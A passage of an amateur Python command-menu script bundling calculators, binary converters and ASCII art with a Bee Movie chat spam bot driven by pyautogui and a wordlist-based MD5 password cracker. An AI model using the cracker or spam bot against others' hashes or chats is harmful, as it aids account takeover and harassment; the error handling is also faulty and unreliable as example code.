    elif instruction.lower() == "beemoviespambot":
        try:
            file = "beemovie.txt"
            file = open(file, 'r')
            for word in file:
                thing = word.split()
            list_count = len(thing)
            list_item = 0
            time.sleep(2)
            for i in range(list_count):
                pyautogui.typewrite(str(thing[list_item]))
                pyautogui.press("enter")
                list_item += 1
                time.sleep(0.7)
        except:
            print("[+] There was an error.")
            print("[+] You can download the beemovie script here:\n[+] https://cdn.discordapp.com/attachments/762349577013559337/783779262216798218/beemovie.txt")
    elif instruction.lower() == "listaveragecalc":
        while True:
            thing = []
            print("[+] Type in 'stop' to start calculating averages.")
            while True:
                try:
                    list_obj = input("[+] Enter a number to add to the list: ")
                    if list_obj.lower() == "stop":
                        break
                    else:
                        thing.append(int(list_obj))
                except:
                    if TypeError:
                        print("[+] You are supposed to enter an integer.")
                    else:
                        print("[+] There was an error.")
            list_item = 1
            try:
                item = thing[0]
                for i in range(len(thing) - 1):
                    l = thing[list_item]
                    item = item + l
                    list_item += 1
                item = item / len(thing)
                print("[+] The Average is", item)
            except:
                if IndexError:
                    print("[+] You did not enter a single number into the list.")
                elif ZeroDivisionError:
                    print("[+] You did not enter a single number into the list.")
            while True:
                doagain = input("[+] Do you wish to add another number to the list?(yes/no): ")
                if doagain.lower() == "yes":
                    print("")
                    break
                elif doagain.lower() == "no":
                    print("")
                    break
                else:
                    print("[+] Invalid Input.")
            if doagain.lower() == "no":
                break
    elif instruction.lower() == "circumfrancecalc":
        print("[+] Using '3.14' as Pi in this calculator.")
        print("[+] Circumfrance Calculator")
        while True:
            try:
                pi = 3.14
                d = int(input("[+] What is the diamater of the circle?: "))
                c = pi * d
                print("[+] The circumfrance of the circle is:", c)
                print("")
            except:
                print("[+] Invalid Input.")
    elif instruction.lower() == "asciiart":
        CODE_LIB = r"B8&WM#YXQO{}[]()I1i!pao;:,.    "
        count = len(CODE_LIB)
        while True:
            try:
                print("[+] Computer Generated Ascii Art")
                print("[+] Get the original code here: https://donche.github.io/en/2019/01/05/ascii_art.html")
                fn = input("[+] Enter image name(putting the image file in the venv folder is suggested): ")
                hratio = float(input("[+] Enter height ratio(default 1.0) : "))
                wratio = float(input("[+] Enter width ratio(default 2.0) : "))
                image_file = Image.open(fn)
                image_file = image_file.resize((int(image_file.size[0] * wratio), int(image_file.size[1] * hratio)))
                print(f'[+] Size info: {image_file.size[0]} {image_file.size[1]}')
                fo = open('result.txt', 'w')
                image_file = image_file.convert("L")
                code_pic = ''
                for h in range(0, image_file.size[1]):
                    for w in range(0, image_file.size[0]):
                        gray = image_file.getpixel((w, h))
                        code_pic = code_pic + CODE_LIB[int(((count - 1) * gray) / 256)]
                    code_pic = code_pic + "\n"
                print(code_pic)
                print("")
                break
            except:
                if ModuleNotFoundError:
                    print("")
                    print("[+] Modules That May Require Downloading: PIL")
                    print("[+] How To Download Them:")
                    print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install PIL")
                    print("")
                else:
                    print("[+] There was an error.")
    elif instruction.lower() == "circleareacalc":
        pi = 3.14
        print("[+] Using '3.14' as Pi in this calculator.")
        print("[+] Circle Area Calculator")
        while True:
            try:
                r = int(input("[+] What is the radius of the circle?: "))
                a = pi * (r * r)
                print("[+] The area of the circle is:", a)
                break
            except:
                print("[+] Invalid Input.")
    elif instruction.lower() == "strtobinary":
        phrase = input("[+] Enter a phrase here: ")
        strtobinary(phrase=phrase)
    elif instruction.lower() == "strtobinarynospace":
        phrase = input("[+] Enter a phrase here: ")
        strtobinarynospace(phrase=phrase)
    elif instruction.lower() == "binarytostr":
        binary = input("[+] Enter Binary here(with spaces): ")
        binarytostr(binary=binary)
    elif instruction.lower() == "binarytostrnospace":
        binary = input("[+] Enter Binary here(without spaces):")
        binarytostrnospace(binary=binary)
    elif instruction.lower() == "strtomd5":
        password = input("[+] Enter a String: ")
        enc_word = password.encode('utf-8')
        digest = hashlib.md5(enc_word.strip()).hexdigest()
        print("[+] The hashed version of",password, "is:", digest)
        print("")
    elif instruction.lower() == "getcputhreadcount":
        cpu_count = os.cpu_count()
        print("[+] Your CPU thread count is:", cpu_count)
        print("")
    elif instruction.lower() == "md5tostr":
        success = False
        hash = input("[+] Enter MD5 Hash: ")
        pass_file = input("[+] Enter Filename where passwords are stored: ")
        try:
            pass_file = open(f"{pass_file}","r")
            correct = True
        except:
            print("[+] File not found.")
            correct = False
        if correct:
            try:
                for word in pass_file:
                    print("[+] Guess:", word)
                    enc_word = word.encode('utf-8')
                    digest = hashlib.md5(enc_word.strip()).hexdigest()
                    print("[+] Hash of Guess:", digest)
                    if digest.strip() == hash.strip():
                        print("[+] Password Found.")
                        print("[+] Password is:", word)
                        success = True
                        print("")
                        break
                    else:
                        print("[+] Guess Incorrect.")
                        print("")
            except:
                pass
        if not success:
            print("[+] Word was not found in file.")
    elif instruction.lower() == "daysuntilcalc":
        while True:
            try:
                today = datetime.date.today()
                print("[+] Today is:", today)
                event = input("[+] What is the event?: ")
                yearofevent = int(input("[+] What is the year of the event?: "))
                monthofevent = int(input("[+] What is the month of the event?: "))
                dayofevent = int(input("[+] What is the day of the event?: "))
                eventdate = datetime.date(yearofevent, monthofevent, dayofevent)
                nexteventYear = today.year + (eventdate.year - today.year)
                nexteventday = datetime.date(nexteventYear, eventdate.month, eventdate.day)
                print("")
                print("[+] Date of " + event + ":", nexteventday)
                diff = nexteventday - today
                if diff.days == 0:
                    print("[+] That is actually today!")
                    print("")
                if diff.days < 0:
                    print("[+] "+event+" was", abs(diff.days),"days ago.")
                    print("")
                if diff.days > 0:
                    print("[+] Days until " + event + ":", diff.days)
                    print("")
                break
            except:
                print("[+] Error Calculating. Please try again.")
                print("")
    elif instruction.lower() == "bash":
        print("")
        print("[+] Do command 'stop' to break the loop.")
        while True:
            try:
                command = input("[+] Enter the command: ")
                if command == "stop":
                    print("")
                    break
                else:
                    os.system(command)
                    print("")
            except:
                print("[+] Command not recognized.")
    elif instruction.lower() == "changelog":
        print("x------------Change-Log-Vers-2.9.9-----------x")
        print("")
        print("- Made things look more visually appealing")
        print("- Added Binary Translators")
        print("  - 2 For Str-Binary")
        print("  - 2 For Binary-Str")
        print("- Fixed Minor Bugs")
        print("- Added MD5 hash translation")
        print("- Added 'Other Tech Related Stuff' Category")
        print("- This Version is now the Original Version")
        print("- Upgraded Email Client")
        print("- Downloads any missing modules upon running")
        print("- Added Days Until Calculator")
        print("- Added terminal commands")
        print("")
        print("x------------------------------------------x")
    elif instruction.lower() == "downloadinfo":
        print("")
        print("[+] Modules That May Require Downloading: getmac, geocoder, publicip, pyautogui, pytube, pywhatkit, pynput, PIL")
        print("[+] How To Download Them:")
        print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install (module_name)")
        print("")
    elif instruction.lower() == "quit":
        print("[+] The script has been stopped.")
        print("[+] Thank you for using this tool.")
        quit()
    else:
        print("[+] Instruction does not exist.")
        print("")